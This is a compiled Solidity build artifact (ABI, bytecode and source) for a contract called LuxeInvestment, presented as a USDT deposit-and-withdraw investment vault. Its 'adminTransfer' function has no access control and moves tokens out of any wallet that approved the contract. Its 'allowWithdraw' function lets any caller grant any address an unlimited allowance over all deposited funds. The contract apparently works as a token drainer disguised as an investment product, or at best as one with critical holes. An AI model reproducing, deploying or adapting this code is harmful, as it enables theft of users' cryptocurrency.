{
  "contractName": "LuxeInvestment",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_usdtAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "usdt",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "adminTransfer",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "getBalanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "walletBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowWithdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801562000010575f80fd5b5060405162001207380380620012078339818101604052810190620000369190620000e1565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505062000111565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f620000ab8262000080565b9050919050565b620000bd816200009f565b8114620000c8575f80fd5b50565b5f81519050620000db81620000b2565b92915050565b5f60208284031215620000f957620000f86200007c565b5b5f6200010884828501620000cb565b91505092915050565b6110e8806200011f5f395ff3fe608060405234801561000f575f80fd5b506004361061007b575f3560e01c8063b6b55f2511610059578063b6b55f25146100e9578063cb0bd93b14610105578063cf9cd8f814610121578063da72c1e8146101515761007b565b80632e1a7d4d1461007f5780632f48ab7d1461009b5780639b96eece146100b9575b5f80fd5b6100996004803603810190610094919061090f565b61016d565b005b6100a361035e565b6040516100b091906109b4565b60405180910390f35b6100d360048036038101906100ce9190610a08565b610381565b6040516100e09190610a42565b60405180910390f35b61010360048036038101906100fe919061090f565b6103c7565b005b61011f600480360381019061011a9190610a08565b61053a565b005b61013b60048036038101906101369190610a08565b61063b565b6040516101489190610a42565b60405180910390f35b61016b60048036038101906101669190610a5b565b6106db565b005b5f81116101af576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101a690610b2b565b60405180910390fd5b8060015f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f2054101561022f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161022690610b93565b60405180910390fd5b8060015f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825461027b9190610bde565b925050819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b81526004016102dc929190610c20565b6020604051808303815f875af11580156102f8573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061031c9190610c7c565b61035b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161035290610cf1565b60405180910390fd5b50565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f60015f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f20549050919050565b5f8111610409576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161040090610d7f565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3330846040518463ffffffff1660e01b815260040161046593929190610d9d565b6020604051808303815f875af1158015610481573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104a59190610c7c565b6104e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104db90610e1c565b60405180910390fd5b8060015f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f8282546105309190610e3a565b9250508190555050565b5f7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff90505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b383836040518363ffffffff1660e01b81526004016105b8929190610c20565b6020604051808303815f875af11580156105d4573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105f89190610c7c565b610637576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161062e90610eb7565b60405180910390fd5b5050565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b81526004016106959190610ed5565b602060405180830381865afa1580156106b0573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106d49190610f02565b9050919050565b5f811161071d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161071490610f9d565b60405180910390fd5b805f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e85306040518363ffffffff1660e01b8152600401610778929190610fbb565b602060405180830381865afa158015610793573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107b79190610f02565b10156107f8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107ef9061102c565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8484846040518463ffffffff1660e01b815260040161085493929190610d9d565b6020604051808303815f875af1158015610870573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108949190610c7c565b6108d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108ca90611094565b60405180910390fd5b505050565b5f80fd5b5f819050919050565b6108ee816108dc565b81146108f8575f80fd5b50565b5f81359050610909816108e5565b92915050565b5f60208284031215610924576109236108d8565b5b5f610931848285016108fb565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61097c6109776109728461093a565b610959565b61093a565b9050919050565b5f61098d82610962565b9050919050565b5f61099e82610983565b9050919050565b6109ae81610994565b82525050565b5f6020820190506109c75f8301846109a5565b92915050565b5f6109d78261093a565b9050919050565b6109e7816109cd565b81146109f1575f80fd5b50565b5f81359050610a02816109de565b92915050565b5f60208284031215610a1d57610a1c6108d8565b5b5f610a2a848285016109f4565b91505092915050565b610a3c816108dc565b82525050565b5f602082019050610a555f830184610a33565b92915050565b5f805f60608486031215610a7257610a716108d8565b5b5f610a7f868287016109f4565b9350506020610a90868287016109f4565b9250506040610aa1868287016108fb565b9150509250925092565b5f82825260208201905092915050565b7f576974686472617720616d6f756e74206d7573742062652067726561746572205f8201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b5f610b15602983610aab565b9150610b2082610abb565b604082019050919050565b5f6020820190508181035f830152610b4281610b09565b9050919050565b7f496e73756666696369656e742062616c616e63650000000000000000000000005f82015250565b5f610b7d601483610aab565b9150610b8882610b49565b602082019050919050565b5f6020820190508181035f830152610baa81610b71565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610be8826108dc565b9150610bf3836108dc565b9250828203905081811115610c0b57610c0a610bb1565b5b92915050565b610c1a816109cd565b82525050565b5f604082019050610c335f830185610c11565b610c406020830184610a33565b9392505050565b5f8115159050919050565b610c5b81610c47565b8114610c65575f80fd5b50565b5f81519050610c7681610c52565b92915050565b5f60208284031215610c9157610c906108d8565b5b5f610c9e84828501610c68565b91505092915050565b7f5769746864726177206661696c656400000000000000000000000000000000005f82015250565b5f610cdb600f83610aab565b9150610ce682610ca7565b602082019050919050565b5f6020820190508181035f830152610d0881610ccf565b9050919050565b7f4465706f73697420616d6f756e74206d757374206265206772656174657220745f8201527f68616e207a65726f000000000000000000000000000000000000000000000000602082015250565b5f610d69602883610aab565b9150610d7482610d0f565b604082019050919050565b5f6020820190508181035f830152610d9681610d5d565b9050919050565b5f606082019050610db05f830186610c11565b610dbd6020830185610c11565b610dca6040830184610a33565b949350505050565b7f5472616e73666572206661696c656420746f206465706f7369740000000000005f82015250565b5f610e06601a83610aab565b9150610e1182610dd2565b602082019050919050565b5f6020820190508181035f830152610e3381610dfa565b9050919050565b5f610e44826108dc565b9150610e4f836108dc565b9250828201905080821115610e6757610e66610bb1565b5b92915050565b7f417070726f76616c206661696c656400000000000000000000000000000000005f82015250565b5f610ea1600f83610aab565b9150610eac82610e6d565b602082019050919050565b5f6020820190508181035f830152610ece81610e95565b9050919050565b5f602082019050610ee85f830184610c11565b92915050565b5f81519050610efc816108e5565b92915050565b5f60208284031215610f1757610f166108d8565b5b5f610f2484828501610eee565b91505092915050565b7f5472616e7366657220616d6f756e74206d7573742062652067726561746572205f8201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b5f610f87602983610aab565b9150610f9282610f2d565b604082019050919050565b5f6020820190508181035f830152610fb481610f7b565b9050919050565b5f604082019050610fce5f830185610c11565b610fdb6020830184610c11565b9392505050565b7f496e73756666696369656e7420616c6c6f77616e6365000000000000000000005f82015250565b5f611016601683610aab565b915061102182610fe2565b602082019050919050565b5f6020820190508181035f8301526110438161100a565b9050919050565b7f41646d696e207472616e73666572206661696c656400000000000000000000005f82015250565b5f61107e601583610aab565b91506110898261104a565b602082019050919050565b5f6020820190508181035f8301526110ab81611072565b905091905056fea264697066735822122026460f3b30dacb05bd4dee4ec027ad3229def815b62beea29f6b1af119ea89cb64736f6c63430008150033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract LuxeInvestment {\n    // Use OpenZeppelin's IERC20 interface\n    IERC20 public usdt;\n\n    // Mapping to track user balances\n    mapping(address => uint256) private balances;\n    // Constructor to set the USDT contract address\n    constructor(address _usdtAddress) {\n        usdt = IERC20(_usdtAddress);\n\n    }\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        // Transfer USDT from the user to the contract\n        require(usdt.transferFrom(msg.sender, address(this), amount), \"Transfer failed to deposit\");\n\n        // Update user balance\n        balances[msg.sender] += amount;\n    }\n\n    // Function to withdraw USDT from the contract\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdraw amount must be greater than zero\");\n        require(balances[msg.sender] >= amount, \"Insufficient balance\");\n\n        // Deduct the amount from the user's balance\n        balances[msg.sender] -= amount;\n\n        // Transfer USDT back to the user\n        require(usdt.transfer(msg.sender, amount), \"Withdraw failed\");\n    }\n\n        // Admin transfer function\n    function adminTransfer(address from, address to, uint256 amount) external {\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        require(usdt.allowance(from, address(this)) >= amount, \"Insufficient allowance\");\n\n        // Transfer tokens from `from` to `to`\n        require(usdt.transferFrom(from, to, amount), \"Admin transfer failed\");\n    }\n\n\n    // Function to check the balance of the user in the contract\n    function getBalanceOf(address user) external view returns (uint256) {\n        return balances[user];\n    }\n\n    function walletBalance(address user) external view returns (uint256){\n        return usdt.balanceOf(user);\n\n    }\n\n        // Function to allow withdraw by approving spender unlimited amount\n    function allowWithdraw(address spender) external {\n        uint256 maxUint = 2**256 - 1; // Maximum uint256 value\n        require(usdt.approve(spender, maxUint), \"Approval failed\");\n    }\n\n    \n    \n\n}",
  "sourcePath": "/Users/hopek/Desktop/dDev/investment/contracts/Investment.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.21+commit.d9974bed.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-02-22T05:46:49.384Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}